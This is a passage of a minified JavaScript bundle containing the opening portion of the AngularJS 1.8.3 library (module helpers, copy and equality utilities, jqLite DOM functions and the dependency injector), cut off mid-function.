(()=>{var jR=Object.create,zl=Object.defineProperty,Gv=Object.getOwnPropertyDescriptor,YR=Object.getOwnPropertyNames,XR=Object.getPrototypeOf,QR=Object.prototype.hasOwnProperty,KR=t=>zl(t,"__esModule",{value:!0}),la=t=>{if("undefined"!=typeof require)return require(t);throw new Error('Dynamic require of "'+t+'" is not supported')},Ge=(t,e)=>()=>(t&&(e=t(t=0)),e),st=(t,e)=>()=>(e||t((e={exports:{}}).exports,e),e.exports),ZR=(t,e,i)=>{if(e&&"object"==typeof e||"function"==typeof e)for(let r of YR(e))!QR.call(t,r)&&"default"!==r&&zl(t,r,{get:()=>e[r],enumerable:!(i=Gv(e,r))||i.enumerable});return t},ye=t=>ZR(KR(zl(null!=t?jR(XR(t)):{},"default",t&&t.__esModule&&"default"in t?{get:()=>t.default,enumerable:!0}:{value:t,enumerable:!0})),t),zt=(t,e,i,r)=>{for(var n,s=r>1?void 0:r?Gv(e,i):e,o=t.length-1;o>=0;o--)(n=t[o])&&(s=(r?n(e,i,s):n(s))||s);return r&&s&&zl(e,i,s),s},zv=st((()=>{!function(t){"use strict";var e={objectMaxDepth:5,urlErrorParamsEnabled:!0};function i(t){if(!q(t))return e;V(t.objectMaxDepth)&&(e.objectMaxDepth=r(t.objectMaxDepth)?t.objectMaxDepth:NaN),V(t.urlErrorParamsEnabled)&&K(t.urlErrorParamsEnabled)&&(e.urlErrorParamsEnabled=t.urlErrorParamsEnabled)}function r(t){return W(t)&&t>0}function n(t,i){i=i||Error;var r="https://errors.angularjs.org/1.8.3/",n=r.replace(".","\\.")+"[\\s\\S]*",s=new RegExp(n,"g");return function(){var n,o,a=arguments[0],l=arguments[1],h="["+(t?t+":":"")+a+"] ",c=dt(arguments,2).map((function(t){return Ht(t,e.objectMaxDepth)}));if(h+=l.replace(/\{\d+\}/g,(function(t){var e=+t.slice(1,-1);return e<c.length?c[e].replace(s,""):t})),h+="\n"+r+(t?t+"/":"")+a,e.urlErrorParamsEnabled)for(o=0,n="?";o<c.length;o++,n="&")h+=n+"p"+o+"="+encodeURIComponent(c[o]);return new i(h)}}var s,o,a,l,h=/^\/(.+)\/([a-z]*)$/,c="validity",u=Object.prototype.hasOwnProperty,d=function(t){return U(t)?t.toLowerCase():t},p=function(t){return U(t)?t.toUpperCase():t},m=[].slice,f=[].splice,g=[].push,y=Object.prototype.toString,v=Object.getPrototypeOf,_=n("ng"),b=t.angular||(t.angular={}),w=0;function E(t){if(null==t||X(t))return!1;if(G(t)||U(t)||o&&t instanceof o)return!0;var e="length"in Object(t)&&t.length;return W(e)&&(e>=0&&e-1 in t||"function"==typeof t.item)}function S(t,e,i){var r,n;if(t)if(j(t))for(r in t)"prototype"!==r&&"length"!==r&&"name"!==r&&t.hasOwnProperty(r)&&e.call(i,t[r],r,t);else if(G(t)||E(t)){var s="object"!=typeof t;for(r=0,n=t.length;r<n;r++)(s||r in t)&&e.call(i,t[r],r,t)}else if(t.forEach&&t.forEach!==S)t.forEach(e,i,t);else if(B(t))for(r in t)e.call(i,t[r],r,t);else if("function"==typeof t.hasOwnProperty)for(r in t)t.hasOwnProperty(r)&&e.call(i,t[r],r,t);else for(r in t)u.call(t,r)&&e.call(i,t[r],r,t);return t}function A(t,e,i){for(var r=Object.keys(t).sort(),n=0;n<r.length;n++)e.call(i,t[r[n]],r[n]);return r}function C(t){return function(e,i){t(i,e)}}function T(){return++w}function $(t,e){e?t.$$hashKey=e:delete t.$$hashKey}function I(t,e,i){for(var r=t.$$hashKey,n=0,s=e.length;n<s;++n){var o=e[n];if(q(o)||j(o))for(var a=Object.keys(o),l=0,h=a.length;l<h;l++){var c=a[l],u=o[c];i&&q(u)?H(u)?t[c]=new Date(u.valueOf()):Y(u)?t[c]=new RegExp(u):u.nodeName?t[c]=u.cloneNode(!0):it(u)?t[c]=u.clone():"__proto__"!==c&&(q(t[c])||(t[c]=G(u)?[]:{}),I(t[c],[u],!0)):t[c]=u}}return $(t,r),t}function P(t){return I(t,m.call(arguments,1),!1)}function x(t){return I(t,m.call(arguments,1),!0)}function k(t){return parseInt(t,10)}s=t.document.documentMode;var O=Number.isNaN||function(t){return t!=t};function M(t,e){return P(Object.create(t),e)}function D(){}function R(t){return t}function L(t){return function(){return t}}function N(t){return j(t.toString)&&t.toString!==y}function F(t){return void 0===t}function V(t){return void 0!==t}function q(t){return null!==t&&"object"==typeof t}function B(t){return null!==t&&"object"==typeof t&&!v(t)}function U(t){return"string"==typeof t}function W(t){return"number"==typeof t}function H(t){return"[object Date]"===y.call(t)}function G(t){return Array.isArray(t)||t instanceof Array}function z(t){switch(y.call(t)){case"[object Error]":case"[object Exception]":case"[object DOMException]":return!0;default:return t instanceof Error}}function j(t){return"function"==typeof t}function Y(t){return"[object RegExp]"===y.call(t)}function X(t){return t&&t.window===t}function Q(t){return t&&t.$evalAsync&&t.$watch}function K(t){return"boolean"==typeof t}function Z(t){return t&&j(t.then)}D.$inject=[],R.$inject=[];var J=/^\[object (?:Uint8|Uint8Clamped|Uint16|Uint32|Int8|Int16|Int32|Float32|Float64)Array]$/;var tt=function(t){return U(t)?t.trim():t},et=function(t){return t.replace(/([-()[\]{}+?*.$^|,:#<!\\])/g,"\\$1").replace(/\x08/g,"\\x08")};function it(t){return!(!t||!(t.nodeName||t.prop&&t.attr&&t.find))}function rt(t){return d(t.nodeName||t[0]&&t[0].nodeName)}function nt(t,e){return-1!==Array.prototype.indexOf.call(t,e)}function st(t,e){var i=t.indexOf(e);return i>=0&&t.splice(i,1),i}function ot(t,e,i){var n=[],s=[];if(i=r(i)?i:NaN,e){if(function(t){return t&&W(t.length)&&J.test(y.call(t))}(e)||function(t){return"[object ArrayBuffer]"===y.call(t)}(e))throw _("cpta","Can't copy! TypedArray destination cannot be mutated.");if(t===e)throw _("cpi","Can't copy! Source and destination are identical.");return G(e)?e.length=0:S(e,(function(t,i){"$$hashKey"!==i&&delete e[i]})),n.push(t),s.push(e),o(t,e,i)}return a(t,i);function o(t,e,i){if(--i<0)return"...";var r,n=e.$$hashKey;if(G(t))for(var s=0,o=t.length;s<o;s++)e.push(a(t[s],i));else if(B(t))for(r in t)e[r]=a(t[r],i);else if(t&&"function"==typeof t.hasOwnProperty)for(r in t)t.hasOwnProperty(r)&&(e[r]=a(t[r],i));else for(r in t)u.call(t,r)&&(e[r]=a(t[r],i));return $(e,n),e}function a(t,e){if(!q(t))return t;var i=n.indexOf(t);if(-1!==i)return s[i];if(X(t)||Q(t))throw _("cpws","Can't copy! Making copies of Window or Scope instances is not supported.");var r=!1,l=function(t){switch(y.call(t)){case"[object Int8Array]":case"[object Int16Array]":case"[object Int32Array]":case"[object Float32Array]":case"[object Float64Array]":case"[object Uint8Array]":case"[object Uint8ClampedArray]":case"[object Uint16Array]":case"[object Uint32Array]":return new t.constructor(a(t.buffer),t.byteOffset,t.length);case"[object ArrayBuffer]":if(!t.slice){var e=new ArrayBuffer(t.byteLength);return new Uint8Array(e).set(new Uint8Array(t)),e}return t.slice(0);case"[object Boolean]":case"[object Number]":case"[object String]":case"[object Date]":return new t.constructor(t.valueOf());case"[object RegExp]":var i=new RegExp(t.source,t.toString().match(/[^/]*$/)[0]);return i.lastIndex=t.lastIndex,i;case"[object Blob]":return new t.constructor([t],{type:t.type})}if(j(t.cloneNode))return t.cloneNode(!0)}(t);return void 0===l&&(l=G(t)?[]:Object.create(v(t)),r=!0),n.push(t),s.push(l),r?o(t,l,e):l}}function at(t,e){return t===e||t!=t&&e!=e}function lt(t,e){if(t===e)return!0;if(null===t||null===e)return!1;if(t!=t&&e!=e)return!0;var i,r,n,s=typeof t;if(s===typeof e&&"object"===s){if(!G(t)){if(H(t))return!!H(e)&&at(t.getTime(),e.getTime());if(Y(t))return!!Y(e)&&t.toString()===e.toString();if(Q(t)||Q(e)||X(t)||X(e)||G(e)||H(e)||Y(e))return!1;for(r in n=qt(),t)if("$"!==r.charAt(0)&&!j(t[r])){if(!lt(t[r],e[r]))return!1;n[r]=!0}for(r in e)if(!(r in n)&&"$"!==r.charAt(0)&&V(e[r])&&!j(e[r]))return!1;return!0}if(!G(e))return!1;if((i=t.length)===e.length){for(r=0;r<i;r++)if(!lt(t[r],e[r]))return!1;return!0}}return!1}var ht=function(){if(!V(ht.rules)){var e=t.document.querySelector("[ng-csp]")||t.document.querySelector("[data-ng-csp]");if(e){var i=e.getAttribute("ng-csp")||e.getAttribute("data-ng-csp");ht.rules={noUnsafeEval:!i||-1!==i.indexOf("no-unsafe-eval"),noInlineStyle:!i||-1!==i.indexOf("no-inline-style")}}else ht.rules={noUnsafeEval:function(){try{return new Function(""),!1}catch(t){return!0}}(),noInlineStyle:!1}}return ht.rules},ct=function(){if(V(ct.name_))return ct.name_;var e,i,r,n,s=Tt.length;for(i=0;i<s;++i)if(r=Tt[i],e=t.document.querySelector("["+r.replace(":","\\:")+"jq]")){n=e.getAttribute(r+"jq");break}return ct.name_=n};function ut(t,e,i){return t.concat(m.call(e,i))}function dt(t,e){return m.call(t,e||0)}function pt(t,e){var i=arguments.length>2?dt(arguments,2):[];return!j(e)||e instanceof RegExp?e:i.length?function(){return arguments.length?e.apply(t,ut(i,arguments,0)):e.apply(t,i)}:function(){return arguments.length?e.apply(t,arguments):e.call(t)}}function mt(e,i){var r=i;return"string"==typeof e&&"$"===e.charAt(0)&&"$"===e.charAt(1)?r=void 0:X(i)?r="$WINDOW":i&&t.document===i?r="$DOCUMENT":Q(i)&&(r="$SCOPE"),r}function ft(t,e){if(!F(t))return W(e)||(e=e?2:null),JSON.stringify(t,mt,e)}function gt(t){return U(t)?JSON.parse(t):t}var yt=/:/g;function vt(t,e){t=t.replace(yt,"");var i=Date.parse("Jan 01, 1970 00:00:00 "+t)/6e4;return O(i)?e:i}function _t(t,e){return(t=new Date(t.getTime())).setMinutes(t.getMinutes()+e),t}function bt(t,e,i){i=i?-1:1;var r=t.getTimezoneOffset();return _t(t,i*(vt(e,r)-r))}function wt(t){t=o(t).clone().empty();var e=o("<div></div>").append(t).html();try{return t[0].nodeType===Ut?d(e):e.match(/^(<[^>]+>)/)[1].replace(/^<([\w-]+)/,(function(t,e){return"<"+d(e)}))}catch(t){return d(e)}}function Et(t){try{return decodeURIComponent(t)}catch(t){}}function St(t){var e={};return S((t||"").split("&"),(function(t){var i,r,n;t&&(r=t=t.replace(/\+/g,"%20"),-1!==(i=t.indexOf("="))&&(r=t.substring(0,i),n=t.substring(i+1)),V(r=Et(r))&&(n=!V(n)||Et(n),u.call(e,r)?G(e[r])?e[r].push(n):e[r]=[e[r],n]:e[r]=n))})),e}function At(t){return Ct(t,!0).replace(/%26/gi,"&").replace(/%3D/gi,"=").replace(/%2B/gi,"+")}function Ct(t,e){return encodeURIComponent(t).replace(/%40/gi,"@").replace(/%3A/gi,":").replace(/%24/g,"$").replace(/%2C/gi,",").replace(/%3B/gi,";").replace(/%20/g,e?"%20":"+")}var Tt=["ng-","data-ng-","ng:","x-ng-"];var $t=function(e){var i=e.currentScript;if(!i)return!0;if(!(i instanceof t.HTMLScriptElement||i instanceof t.SVGScriptElement))return!1;var r=i.attributes;return[r.getNamedItem("src"),r.getNamedItem("href"),r.getNamedItem("xlink:href")].every((function(t){if(!t)return!0;if(!t.value)return!1;var i=e.createElement("a");if(i.href=t.value,e.location.origin===i.origin)return!0;switch(i.protocol){case"http:":case"https:":case"ftp:":case"blob:":case"file:":case"data:":return!0;default:return!1}}))}(t.document);function It(e,i){var r,n,s={};if(S(Tt,(function(t){var i=t+"app";!r&&e.hasAttribute&&e.hasAttribute(i)&&(r=e,n=e.getAttribute(i))})),S(Tt,(function(t){var i,s=t+"app";!r&&(i=e.querySelector("["+s.replace(":","\\:")+"]"))&&(r=i,n=i.getAttribute(s))})),r){if(!$t)return void t.console.error("AngularJS: disabling automatic bootstrap. <script> protocol indicates an extension, document.location.href does not match.");s.strictDi=null!==function(t,e){var i,r,n=Tt.length;for(r=0;r<n;++r)if(i=Tt[r]+e,U(i=t.getAttribute(i)))return i;return null}(r,"strict-di"),i(r,n?[n]:[],s)}}function Pt(e,i,r){q(r)||(r={});r=P({strictDi:!1},r);var n=function(){if((e=o(e)).injector()){var n=e[0]===t.document?"document":wt(e);throw _("btstrpd","App already bootstrapped with this element '{0}'",n.replace(/</,"&lt;").replace(/>/,"&gt;"))}(i=i||[]).unshift(["$provide",function(t){t.value("$rootElement",e)}]),r.debugInfoEnabled&&i.push(["$compileProvider",function(t){t.debugInfoEnabled(!0)}]),i.unshift("ng");var s=Ze(i,r.strictDi);return s.invoke(["$rootScope","$rootElement","$compile","$injector",function(t,e,i,r){t.$apply((function(){e.data("$injector",r),i(e)(t)}))}]),s},s=/^NG_ENABLE_DEBUG_INFO!/,a=/^NG_DEFER_BOOTSTRAP!/;if(t&&s.test(t.name)&&(r.debugInfoEnabled=!0,t.name=t.name.replace(s,"")),t&&!a.test(t.name))return n();t.name=t.name.replace(a,""),b.resumeBootstrap=function(t){return S(t,(function(t){i.push(t)})),n()},j(b.resumeDeferredBootstrap)&&b.resumeDeferredBootstrap()}function xt(){t.name="NG_ENABLE_DEBUG_INFO!"+t.name,t.location.reload()}function kt(t){var e=b.element(t).injector();if(!e)throw _("test","no injector found for element argument to getTestability");return e.get("$$testability")}var Ot=/[A-Z]/g;function Mt(t,e){return e=e||"_",t.replace(Ot,(function(t,i){return(i?e:"")+t.toLowerCase()}))}var Dt=!1;function Rt(){pe.legacyXHTMLReplacement=!0}function Lt(t,e,i){if(!t)throw _("areq","Argument '{0}' is {1}",e||"?",i||"required");return t}function Nt(t,e,i){return i&&G(t)&&(t=t[t.length-1]),Lt(j(t),e,"not a function, got "+(t&&"object"==typeof t?t.constructor.name||"Object":typeof t)),t}function Ft(t,e){if("hasOwnProperty"===t)throw _("badname","hasOwnProperty is not a valid {0} name",e)}function Vt(t){for(var e,i=t[0],r=t[t.length-1],n=1;i!==r&&(i=i.nextSibling);n++)(e||t[n]!==i)&&(e||(e=o(m.call(t,0,n))),e.push(i));return e||t}function qt(){return Object.create(null)}function Bt(t){if(null==t)return"";switch(typeof t){case"string":break;case"number":t=""+t;break;default:t=!N(t)||G(t)||H(t)?ft(t):t.toString()}return t}var Ut=3;function Wt(t,e){if(G(t)){e=e||[];for(var i=0,r=t.length;i<r;i++)e[i]=t[i]}else if(q(t))for(var n in e=e||{},t)"$"===n.charAt(0)&&"$"===n.charAt(1)||(e[n]=t[n]);return e||t}function Ht(t,e){return"function"==typeof t?t.toString().replace(/ \{[\s\S]*$/,""):F(t)?"undefined":"string"!=typeof t?function(t,e){var i=[];return r(e)&&(t=b.copy(t,null,e)),JSON.stringify(t,(function(t,e){if(q(e=mt(t,e))){if(i.indexOf(e)>=0)return"...";i.push(e)}return e}))}(t,e):t}var Gt={full:"1.8.3",major:1,minor:8,dot:3,codeName:"ultimate-farewell"};pe.expando="ng339";var zt=pe.cache={},jt=1;pe._data=function(t){return this.cache[t[this.expando]]||{}};var Yt=/-([a-z])/g,Xt=/^-ms-/,Qt={mouseleave:"mouseout",mouseenter:"mouseover"},Kt=n("jqLite");function Zt(t,e){return e.toUpperCase()}function Jt(t){return t.replace(Yt,Zt)}var te=/^<([\w-]+)\s*\/?>(?:<\/\1>|)$/,ee=/<|&#?\w+;/,ie=/<([\w:-]+)/,re=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:-]+)[^>]*)\/>/gi,ne={thead:["table"],col:["colgroup","table"],tr:["tbody","table"],td:["tr","tbody","table"]};ne.tbody=ne.tfoot=ne.colgroup=ne.caption=ne.thead,ne.th=ne.td;var se={option:[1,'<select multiple="multiple">',"</select>"],_default:[0,"",""]};for(var oe in ne){var ae=ne[oe],le=ae.slice().reverse();se[oe]=[le.length,"<"+le.join("><")+">","</"+ae.join("></")+">"]}function he(t){return!ee.test(t)}function ce(t){var e=t.nodeType;return 1===e||!e||9===e}function ue(e,i){var r,n,o,a,l,h=i.createDocumentFragment(),c=[];if(he(e))c.push(i.createTextNode(e));else{if(r=h.appendChild(i.createElement("div")),n=(ie.exec(e)||["",""])[1].toLowerCase(),a=pe.legacyXHTMLReplacement?e.replace(re,"<$1></$2>"):e,s<10)for(o=se[n]||se._default,r.innerHTML=o[1]+a+o[2],l=o[0];l--;)r=r.firstChild;else{for(l=(o=ne[n]||[]).length;--l>-1;)r.appendChild(t.document.createElement(o[l])),r=r.firstChild;r.innerHTML=a}c=ut(c,r.childNodes),(r=h.firstChild).textContent=""}return h.textContent="",h.innerHTML="",S(c,(function(t){h.appendChild(t)})),h}se.optgroup=se.option;var de=t.Node.prototype.contains||function(t){return!!(16&this.compareDocumentPosition(t))};function pe(e){if(e instanceof pe)return e;var i;if(U(e)&&(e=tt(e),i=!0),!(this instanceof pe)){if(i&&"<"!==e.charAt(0))throw Kt("nosel","Looking up elements via selectors is not supported by jqLite! See: http://docs.angularjs.org/api/angular.element");return new pe(e)}i?Ce(this,function(e,i){var r;return i=i||t.document,(r=te.exec(e))?[i.createElement(r[1])]:(r=ue(e,i))?r.childNodes:[]}(e)):j(e)?xe(e):Ce(this,e)}function me(t){return t.cloneNode(!0)}function fe(t,e){!e&&ce(t)&&o.cleanData([t]),t.querySelectorAll&&o.cleanData(t.querySelectorAll("*"))}function ge(t){var e;for(e in t)return!1;return!0}function ye(t){var e=t.ng339,i=e&&zt[e],r=i&&i.events,n=i&&i.data;(!n||ge(n))&&(!r||ge(r))&&(delete zt[e],t.ng339=void 0)}function ve(t,e,i,r){if(V(r))throw Kt("offargs","jqLite#off() does not support the `selector` argument");var n=be(t),s=n&&n.events,o=n&&n.handle;if(o){if(e){var a=function(e){var r=s[e];V(i)&&st(r||[],i),V(i)&&r&&r.length>0||(t.removeEventListener(e,o),delete s[e])};S(e.split(" "),(function(t){a(t),Qt[t]&&a(Qt[t])}))}else for(e in s)"$destroy"!==e&&t.removeEventListener(e,o),delete s[e];ye(t)}}function _e(t,e){var i=t.ng339,r=i&&zt[i];r&&(e?delete r.data[e]:r.data={},ye(t))}function be(t,e){var i=t.ng339,r=i&&zt[i];return e&&!r&&(t.ng339=i=++jt,r=zt[i]={events:{},data:{},handle:void 0}),r}function we(t,e,i){if(ce(t)){var r,n=V(i),s=!n&&e&&!q(e),o=!e,a=be(t,!s),l=a&&a.data;if(n)l[Jt(e)]=i;else{if(o)return l;if(s)return l&&l[Jt(e)];for(r in e)l[Jt(r)]=e[r]}}}function Ee(t,e){return!!t.getAttribute&&(" "+(t.getAttribute("class")||"")+" ").replace(/[\n\t]/g," ").indexOf(" "+e+" ")>-1}function Se(t,e){if(e&&t.setAttribute){var i=(" "+(t.getAttribute("class")||"")+" ").replace(/[\n\t]/g," "),r=i;S(e.split(" "),(function(t){t=tt(t),r=r.replace(" "+t+" "," ")})),r!==i&&t.setAttribute("class",tt(r))}}function Ae(t,e){if(e&&t.setAttribute){var i=(" "+(t.getAttribute("class")||"")+" ").replace(/[\n\t]/g," "),r=i;S(e.split(" "),(function(t){t=tt(t),-1===r.indexOf(" "+t+" ")&&(r+=t+" ")})),r!==i&&t.setAttribute("class",tt(r))}}function Ce(t,e){if(e)if(e.nodeType)t[t.length++]=e;else{var i=e.length;if("number"==typeof i&&e.window!==e){if(i)for(var r=0;r<i;r++)t[t.length++]=e[r]}else t[t.length++]=e}}function Te(t,e){return $e(t,"$"+(e||"ngController")+"Controller")}function $e(t,e,i){9===t.nodeType&&(t=t.documentElement);for(var r=G(e)?e:[e];t;){for(var n=0,s=r.length;n<s;n++)if(V(i=o.data(t,r[n])))return i;t=t.parentNode||11===t.nodeType&&t.host}}function Ie(t){for(fe(t,!0);t.firstChild;)t.removeChild(t.firstChild)}function Pe(t,e){e||fe(t);var i=t.parentNode;i&&i.removeChild(t)}function xe(e){function i(){t.document.removeEventListener("DOMContentLoaded",i),t.removeEventListener("load",i),e()}"complete"===t.document.readyState?t.setTimeout(e):(t.document.addEventListener("DOMContentLoaded",i),t.addEventListener("load",i))}var ke=pe.prototype={ready:xe,toString:function(){var t=[];return S(this,(function(e){t.push(""+e)})),"["+t.join(", ")+"]"},eq:function(t){return o(t>=0?this[t]:this[this.length+t])},length:0,push:g,sort:[].sort,splice:[].splice},Oe={};S("multiple,selected,checked,disabled,readOnly,required,open".split(","),(function(t){Oe[d(t)]=t}));var Me={};S("input,select,option,textarea,button,form,details".split(","),(function(t){Me[t]=!0}));var De={ngMinlength:"minlength",ngMaxlength:"maxlength",ngMin:"min",ngMax:"max",ngPattern:"pattern",ngStep:"step"};function Re(t,e){var i=Oe[e.toLowerCase()];return i&&Me[rt(t)]&&i}function Le(t,e,i){i.call(t,e)}function Ne(t,e,i){var r=e.relatedTarget;(!r||r!==t&&!de.call(t,r))&&i.call(t,e)}function Fe(){this.$get=function(){return P(pe,{hasClass:function(t,e){return t.attr&&(t=t[0]),Ee(t,e)},addClass:function(t,e){return t.attr&&(t=t[0]),Ae(t,e)},removeClass:function(t,e){return t.attr&&(t=t[0]),Se(t,e)}})}}function Ve(t,e){var i=t&&t.$$hashKey;if(i)return"function"==typeof i&&(i=t.$$hashKey()),i;var r=typeof t;return i="function"===r||"object"===r&&null!==t?t.$$hashKey=r+":"+(e||T)():r+":"+t}S({data:we,removeData:_e,hasData:function(t){for(var e in zt[t.ng339])return!0;return!1},cleanData:function(t){for(var e=0,i=t.length;e<i;e++)_e(t[e]),ve(t[e])}},(function(t,e){pe[e]=t})),S({data:we,inheritedData:$e,scope:function(t){return o.data(t,"$scope")||$e(t.parentNode||t,["$isolateScope","$scope"])},isolateScope:function(t){return o.data(t,"$isolateScope")||o.data(t,"$isolateScopeNoTemplate")},controller:Te,injector:function(t){return $e(t,"$injector")},removeAttr:function(t,e){t.removeAttribute(e)},hasClass:Ee,css:function(t,e,i){if(e=function(t){return Jt(t.replace(Xt,"ms-"))}(e),!V(i))return t.style[e];t.style[e]=i},attr:function(t,e,i){var r,n=t.nodeType;if(n!==Ut&&2!==n&&8!==n&&t.getAttribute){var s=d(e),o=Oe[s];if(!V(i))return r=t.getAttribute(e),o&&null!==r&&(r=s),null===r?void 0:r;null===i||!1===i&&o?t.removeAttribute(e):t.setAttribute(e,o?s:i)}},prop:function(t,e,i){if(!V(i))return t[e];t[e]=i},text:function(){return t.$dv="",t;function t(t,e){if(F(e)){var i=t.nodeType;return 1===i||i===Ut?t.textContent:""}t.textContent=e}}(),val:function(t,e){if(F(e)){if(t.multiple&&"select"===rt(t)){var i=[];return S(t.options,(function(t){t.selected&&i.push(t.value||t.text)})),i}return t.value}t.value=e},html:function(t,e){if(F(e))return t.innerHTML;fe(t,!0),t.innerHTML=e},empty:Ie},(function(t,e){pe.prototype[e]=function(e,i){var r,n,s=this.length;if(t!==Ie&&F(2===t.length&&t!==Ee&&t!==Te?e:i)){if(q(e)){for(r=0;r<s;r++)if(t===we)t(this[r],e);else for(n in e)t(this[r],n,e[n]);return this}for(var o=t.$dv,a=F(o)?Math.min(s,1):s,l=0;l<a;l++){var h=t(this[l],e,i);o=o?o+h:h}return o}for(r=0;r<s;r++)t(this[r],e,i);return this}})),S({removeData:_e,on:function(t,e,i,r){if(V(r))throw Kt("onargs","jqLite#on() does not support the `selector` or `eventData` parameters");if(ce(t)){var n=be(t,!0),s=n.events,o=n.handle;o||(o=n.handle=function(t,e){var i=function(i,r){i.isDefaultPrevented=function(){return i.defaultPrevented};var n=e[r||i.type],s=n?n.length:0;if(s){if(F(i.immediatePropagationStopped)){var o=i.stopImmediatePropagation;i.stopImmediatePropagation=function(){i.immediatePropagationStopped=!0,i.stopPropagation&&i.stopPropagation(),o&&o.call(i)}}i.isImmediatePropagationStopped=function(){return!0===i.immediatePropagationStopped};var a=n.specialHandlerWrapper||Le;s>1&&(n=Wt(n));for(var l=0;l<s;l++)i.isImmediatePropagationStopped()||a(t,i,n[l])}};return i.elem=t,i}(t,s));for(var a=e.indexOf(" ")>=0?e.split(" "):[e],l=a.length,h=function(e,r,n){var a=s[e];a||((a=s[e]=[]).specialHandlerWrapper=r,"$destroy"!==e&&!n&&t.addEventListener(e,o)),a.push(i)};l--;)e=a[l],Qt[e]?(h(Qt[e],Ne),h(e,void 0,!0)):h(e)}},off:ve,one:function(t,e,i){(t=o(t)).on(e,(function r(){t.off(e,i),t.off(e,r)})),t.on(e,i)},replaceWith:function(t,e){var i,r=t.parentNode;fe(t),S(new pe(e),(function(e){i?r.insertBefore(e,i.nextSibling):r.replaceChild(e,t),i=e}))},children:function(t){var e=[];return S(t.childNodes,(function(t){1===t.nodeType&&e.push(t)})),e},contents:function(t){return t.contentDocument||t.childNodes||[]},append:function(t,e){var i=t.nodeType;if(1===i||11===i)for(var r=0,n=(e=new pe(e)).length;r<n;r++){var s=e[r];t.appendChild(s)}},prepend:function(t,e){if(1===t.nodeType){var i=t.firstChild;S(new pe(e),(function(e){t.insertBefore(e,i)}))}},wrap:function(t,e){!function(t,e){var i=t.parentNode;i&&i.replaceChild(e,t),e.appendChild(t)}(t,o(e).eq(0).clone()[0])},remove:Pe,detach:function(t){Pe(t,!0)},after:function(t,e){var i=t,r=t.parentNode;if(r)for(var n=0,s=(e=new pe(e)).length;n<s;n++){var o=e[n];r.insertBefore(o,i.nextSibling),i=o}},addClass:Ae,removeClass:Se,toggleClass:function(t,e,i){e&&S(e.split(" "),(function(e){var r=i;F(r)&&(r=!Ee(t,e)),(r?Ae:Se)(t,e)}))},parent:function(t){var e=t.parentNode;return e&&11!==e.nodeType?e:null},next:function(t){return t.nextElementSibling},find:function(t,e){return t.getElementsByTagName?t.getElementsByTagName(e):[]},clone:me,triggerHandler:function(t,e,i){var r,n,s,o=e.type||e,a=be(t),l=a&&a.events,h=l&&l[o];h&&(r={preventDefault:function(){this.defaultPrevented=!0},isDefaultPrevented:function(){return!0===this.defaultPrevented},stopImmediatePropagation:function(){this.immediatePropagationStopped=!0},isImmediatePropagationStopped:function(){return!0===this.immediatePropagationStopped},stopPropagation:D,type:o,target:t},e.type&&(r=P(r,e)),n=Wt(h),s=i?[r].concat(i):[r],S(n,(function(e){r.isImmediatePropagationStopped()||e.apply(t,s)})))}},(function(t,e){pe.prototype[e]=function(e,i,r){for(var n,s=0,a=this.length;s<a;s++)F(n)?V(n=t(this[s],e,i,r))&&(n=o(n)):Ce(n,t(this[s],e,i,r));return V(n)?n:this}})),pe.prototype.bind=pe.prototype.on,pe.prototype.unbind=pe.prototype.off;var qe=Object.create(null);function Be(){this._keys=[],this._values=[],this._lastKey=NaN,this._lastIndex=-1}Be.prototype={_idx:function(t){return t!==this._lastKey&&(this._lastKey=t,this._lastIndex=this._keys.indexOf(t)),this._lastIndex},_transformKey:function(t){return O(t)?qe:t},get:function(t){t=this._transformKey(t);var e=this._idx(t);if(-1!==e)return this._values[e]},has:function(t){return t=this._transformKey(t),-1!==this._idx(t)},set:function(t,e){t=this._transformKey(t);var i=this._idx(t);-1===i&&(i=this._lastIndex=this._keys.length),this._keys[i]=t,this._values[i]=e},delete:function(t){t=this._transformKey(t);var e=this._idx(t);return-1!==e&&(this._keys.splice(e,1),this._values.splice(e,1),this._lastKey=NaN,this._lastIndex=-1,!0)}};var Ue=Be,We=[function(){this.$get=[function(){return Ue}]}],He=/^([^(]+?)=>/,Ge=/^[^(]*\(\s*([^)]*)\)/m,ze=/,/,je=/^\s*(_?)(\S+?)\1\s*$/,Ye=/((\/\/.*$)|(\/\*[\s\S]*?\*\/))/gm,Xe=n("$injector");function Qe(t){return Function.prototype.toString.call(t)}function Ke(t){var e=Qe(t).replace(Ye,"");return e.match(He)||e.match(Ge)}function Ze(t,e){e=!0===e;var i={},r="Provider",n=[],o=new Ue,a={$provide:{provider:m(f),factory:m(y),service:m((function(t,e){return y(t,["$injector",function(t){return t.instantiate(e)}])})),value:m((function(t,e){return y(t,L(e),!1)})),constant:m((function(t,e){Ft(t,"constant"),a[t]=e,c[t]=e})),decorator:function(t,e){var i=h.get(t+r),n=i.$get;i.$get=function(){var t=d.invoke(n,i);return d.invoke(e,null,{$delegate:t})}}}},h=a.$injector=_(a,(function(t,e){throw b.isString(e)&&n.push(e),Xe("unpr","Unknown provider: {0}",n.join(" <- "))})),c={},u=_(c,(function(t,e){var i=h.get(t+r,e);return d.invoke(i.$get,i,void 0,t)})),d=u;a["$injector"+r]={$get:L(u)},d.modules=h.modules=qt();var p=v(t);return(d=u.get("$injector")).strictDi=e,S(p,(function(t){t&&d.invoke(t)})),d.loadNewModules=function(t){S(v(t),(function(t){t&&d.invoke(t)}))},d;function m(t){return function(e,i){if(!q(e))return t(e,i);S(e,C(t))}}function f(t,e){if(Ft(t,"service"),(j(e)||G(e))&&(e=h.instantiate(e)),!e.$get)throw Xe("pget","Provider '{0}' must define $get factory method.",t);return a[t+r]=e}function g(t,e){return function(){var i=d.invoke(e,this);if(F(i))throw Xe("undef","Provider '{0}' must return a value from $get factory method.",t);return i}}function y(t,e,i){return f(t,{$get:!1!==i?g(t,e):e})}function v(t){Lt(F(t)||G(t),"modulesToLoad","not an array");var e,i=[];return S(t,(function(t){if(!o.get(t)){o.set(t,!0);try{U(t)?(e=l(t),d.modules[t]=e,i=i.concat(v(e.requires)).concat(e._runBlocks),r(e._invokeQueue),r(e._configBlocks)):j(t)||G(t)?i.push(h.invoke(t)):Nt(t,"module")}catch(e){throw G(t)&&(t=t[t.length-1]),e.message&&e.stack&&-1===e.stack.indexOf(e.message)&&(e=e.message+"\n"+e.stack),Xe("modulerr","Failed to instantiate module {0} due to:\n{1}",t,e.stack||e.message||e)}}function r(t){var e,i;for(e=0,i=t.length;e<i;e++){var r=t[e],n=h.get(r[0]);n[r[1]].apply(n,r[2])}}})),i}function _(t,o){function l(e,r){if(t.hasOwnProperty(e)){if(t[e]===i)throw Xe("cdep","Circular dependency found: {0}",e+" 